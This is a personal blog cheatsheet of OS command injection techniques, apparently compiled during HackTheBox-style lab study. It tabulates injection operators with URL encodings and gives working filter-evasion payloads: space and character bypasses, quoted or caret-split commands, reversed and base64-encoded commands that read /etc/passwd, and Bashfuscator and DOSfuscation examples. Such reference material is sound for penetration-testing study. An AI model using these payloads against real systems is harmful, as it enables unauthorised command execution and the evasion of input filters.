---
layout: post
title: "Cheatsheet-Command-Injection"
description: Cheatsheet for command injection techniques.
---

<p>These cheatsheets serve as my personal quick reference. Therefore, they’re less organized than the box walkthroughs, but I’ve shared them in case others find them useful.</p>

<style>
table {
  width: auto;
  border-collapse: collapse;
  table-layout: auto; /* let the content decide column width */
}


th, td {
  border: 1px solid #333;
  padding: 8px;
  text-align: left;
  vertical-align: top;
}
#evasion_tools {
  table-layout: fixed;
  width: 100%;
}



code {
  white-space: nowrap;  /* keep code on a single line */
}
</style>


<h2>Command injection methods</h2>

<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Operator</th>
      <th>Symbol</th>
      <th>URL Encoded</th>
      <th>Execution Behavior</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Semicolon</td>
      <td>;</td>
      <td>%3b</td>
      <td>Both</td>
    </tr>
    <tr>
      <td>New Line</td>
      <td>\n</td>
      <td>%0a</td>
      <td>Both</td>
    </tr>
    <tr>
      <td>Background</td>
      <td>&amp;</td>
      <td>%26</td>
      <td>Both (second output generally shown first)</td>
    </tr>
    <tr>
      <td>Pipe</td>
      <td>|</td>
      <td>%7c</td>
      <td>Both (only second output is shown)</td>
    </tr>
    <tr>
      <td>AND</td>
      <td>&amp;&amp;</td>
      <td>%26%26</td>
      <td>Both (only if first succeeds)</td>
    </tr>
    <tr>
      <td>OR</td>
      <td>||</td>
      <td>%7c%7c</td>
      <td>Second (only if first fails)</td>
    </tr>
    <tr>
      <td>Sub-Shell</td>
      <td>``</td>
      <td>%60%60</td>
      <td>Both (Linux-only)</td>
    </tr>
    <tr>
      <td>Sub-Shell</td>
      <td>$()</td>
      <td>%24%28%29</td>
      <td>Both (Linux-only)</td>
    </tr>
  </tbody>
</table>

<p>Note: Id there is only sanitization happening on front-end (can see as there are no network requests being made in developer tools). Then, this can be bypassed by intercepting a request with Burpsuite and editing it there.</p>

<h2>Bypassing space filters</h2>

<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Bypass Technique</th>
      <th>Description</th>
      <th>Example Usage</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>%09 (Tab)</td>
      <td>Replaces the space with a tab character. Both Linux and Windows interpret tabs as valid argument separators.</td>
      <td><code>127.0.0.1%0a%09whoami</code></td>
    </tr>
    <tr>
      <td>${IFS}</td>
      <td>Uses the Linux Internal Field Separator (defaults to space/tab). Expands into a space automatically.</td>
      <td><code>127.0.0.1%0a${IFS}whoami</code></td>
    </tr>
    <tr>
      <td>Brace Expansion</td>
      <td>Leverages Bash brace expansion to insert a space between arguments without explicitly typing it.</td>
      <td><code>127.0.0.1%0a{ls,-la}</code></td>
    </tr>
  </tbody>
</table>

<h2>Bypassing restricted characters</h2>

<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Bypass Technique</th>
      <th>Linux</th>
      <th>Windows</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Environment Variables</td>
      <td>
        Extract specific characters from environment variables.  
        <br><code>${PATH:0:1}</code> → <code>/</code>  
        <br><code>${LS_COLORS:10:1}</code> → <code>;</code>
      </td>
      <td>
        Use substring extraction in CMD or indexing in PowerShell.  
        <br><code>%HOMEPATH:~6,-11%</code> → <code>\</code> -11% is length 
        <br><code>$env:HOMEPATH[0]</code> → <code>\</code>
      </td>
    </tr>
    <tr>
      <td>Character Shifting</td>
      <td>
        Shift ASCII characters using <code>tr</code>.  
        <br>Example (get <code>\</code>):  
        <br><code>echo $(tr '!-}' '"-~' &lt;&lt;&lt; [)</code> change "]" with previous char
      </td>
      <td>
        PowerShell can shift characters by ASCII values, though syntax is longer.  
        Example: use <code>[char](91+1)</code> to produce <code>\</code>.
      </td>
    </tr>
    <tr>
      <td>Exploring Variables</td>
      <td>
        Use <code>printenv</code> to list environment variables and pick useful characters.
      </td>
      <td>
        Use <code>Get-ChildItem Env:</code> in PowerShell to explore environment variables for usable characters. Use as follows: <code>$env:PROGRAMFILES[10]</code>
      </td>
    </tr>
  </tbody>
</table>

<h2>Bypassing blacklisted commands</h2>
<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Bypass Technique</th>
      <th>Linux</th>
      <th>Windows</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Insert Quotes (works on both)(need to be even and not mixed)</td>
      <td>
        Use single or double quotes between characters.  
        <br><code>w'h'o'am'i</code>  
        <br><code>w"h"o"am"i</code>
      </td>
      <td>
        Same trick works in CMD and PowerShell.  
        <br><code>w'h'o'am'i</code>  
        <br><code>w"h"o"am"i</code>
      </td>
    </tr>
    <tr>
      <td>Ignored Characters (Linux only)</td>
      <td>
        Insert Bash-tolerated characters inside commands.  
        <br><code>who$@ami</code>  
        <br><code>w\ho\am\i</code>
      </td>
      <td>
        – (not applicable)
      </td>
    </tr>
    <tr>
      <td>Caret Insertion (Windows only)</td>
      <td>
        – (not applicable)
      </td>
      <td>
        Insert <code>^</code> into commands in CMD.  
        <br><code>who^ami</code>
      </td>
    </tr>
  </tbody>
</table>

<h2>Advanced command obfuscation</h2>

<table cellpadding="6" cellspacing="0">
  <thead>
    <tr>
      <th>Obfuscation Technique</th>
      <th>Linux</th>
      <th>Windows</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Case Manipulation</td>
      <td>
        Linux is case-sensitive, so we must normalize case.  
        <br><code>$(tr "[A-Z]" "[a-z]" &lt;&lt;&lt; "WhOaMi")</code>  
        <br><code>$(a="WhOaMi"; printf %s "${a,,}")</code>
      </td>
      <td>
        Windows is case-insensitive, so any variation works.  
        <br><code>WhOaMi</code>  
        <br><code>WHOAMI</code>
      </td>
    </tr>
    <tr>
      <td>Reversed Commands</td>
      <td>
        Reverse string with <code>rev</code> and execute.  
        <br><code>echo 'whoami' | rev</code> → <code>imaohw</code>  
        <br><code>$(rev &lt;&lt;&lt; 'imaohw')</code>
      </td>
      <td>
        Reverse string with PowerShell array slicing.  
        <br><code>"whoami"[-1..-20] -join ''</code> → <code>imaohw</code>  
        <br><code>iex "$('imaohw'[-1..-20] -join '')"</code>
      </td>
    </tr>
    <tr>
      <td>Encoded Commands (Base64)</td>
      <td>
        Encode command and decode at runtime.  
        <br><code>echo -n 'cat /etc/passwd | grep 33' | base64</code>  
        <br><code>bash &lt;&lt;&lt; $(base64 -d &lt;&lt;&lt; Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code>
      </td>
      <td>
        Encode command to UTF-16LE b64.  
        <br><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code>
        <br><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code>
      </td>
    </tr>
  </tbody>
</table>

<h2>Evasion tools</h2>


<table cellpadding="6" cellspacing="0" id="evasion_tools">
  <colgroup>
    <col style="width: 15%">
    <col style="width: 10%">
    <col style="width: 50%">
    <col style="width: 25%">
  </colgroup>
  <thead>
    <tr>
      <th>Tool</th>
      <th>Platform</th>
      <th>Description</th>
      <th>Example Usage</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Bashfuscator</td>
      <td>Linux</td>
      <td>
        Obfuscates Bash commands using multiple techniques.
      </td>
      <td>
        <code>./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1</code><br>
        Execute with: <code>bash -c 'eval "$(W0=(w \ t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'</code>
      </td>
    </tr>
    <tr>
      <td>DOSfuscation</td>
      <td>Windows</td>
      <td>
        Interactive tool to obfuscate CMD or PowerShell commands.
      </td>
      <td>
        <code>Invoke-DOSfuscation&gt; SET COMMAND type C:\Users\htb-student\Desktop\flag.txt</code><br>
        <code>Invoke-DOSfuscation&gt; encoding</code><br>
        Execute in CMD or PowerShell: <code>typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt</code>
      </td>
    </tr>
  </tbody>
</table>

<p>Combine all these techniques to get a working payload</p>





